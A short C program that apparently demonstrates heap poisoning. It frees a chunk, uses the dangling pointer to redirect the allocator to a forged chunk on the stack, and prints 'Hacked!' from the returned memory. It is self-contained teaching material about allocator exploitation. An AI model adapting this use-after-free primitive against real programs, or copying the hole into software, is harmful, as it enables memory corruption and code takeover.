#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef unsigned long long LONG;
const LONG SIZE = 0x10;

struct Chunk
{
	LONG pre_size, size;
	struct Chunk *fd, *bk;
};

int main()
{
	void *temp = malloc(SIZE);
	struct Chunk Forged;
	Forged.size = 0x20;
	char *data = (char *)&Forged.fd;
	strcpy(data, "Hacked!\n");
	free(temp);
	*(LONG *)temp = (LONG)&Forged;
	temp = malloc(SIZE);
	void *victim = malloc(SIZE);
	write(1, (char *)victim, 8);
}
